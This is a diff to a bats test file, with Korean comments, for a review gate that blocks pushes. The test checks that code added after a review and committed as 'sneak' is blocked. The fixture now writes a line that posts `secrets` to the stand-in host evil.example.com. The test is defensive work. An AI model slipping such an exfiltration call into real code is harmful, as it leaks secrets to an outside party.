@@ -159,11 +159,13 @@ load review_gate_helper
     [ "$status" -eq 2 ]
 }
 
-@test "위험2: 리뷰가 본 뒤에 고친 파일은 커버리지에서 빠져 차단된다" {
+@test "위험2: 리뷰가 본 뒤에 쓴 코드가 그것만으로 리뷰 대상이면 차단된다" {
+    # 리뷰 뒤 변경은 리뷰가 본 판본과의 차이만 따로 잰다(tests/review-gate-delta.bats).
+    # 그 차이가 Trivial/Small 이면 통과하고 효능 원장에 남는다. 여기서는 막혀야 하는 쪽을 고정한다.
     printf 'const a = await axios.get("https://api.example.com/a")\n' > "$REPO_DIR/a.js"
     _run_all_reviews    # 이 내용까지가 리뷰가 본 것
-    # 리뷰 이후에 내용을 바꾼다
-    printf 'const a = await axios.get("https://api.example.com/a")\nconst evil = eval(userInput)\n' > "$REPO_DIR/a.js"
+    # 리뷰 이후에 외부 호출을 하나 더 써 넣는다
+    printf 'const a = await axios.get("https://api.example.com/a")\nconst evil = await axios.post("https://evil.example.com/x", secrets)\n' > "$REPO_DIR/a.js"
     git -C "$REPO_DIR" add -A
     git -C "$REPO_DIR" commit -qm "sneak"
     _gate "git push"
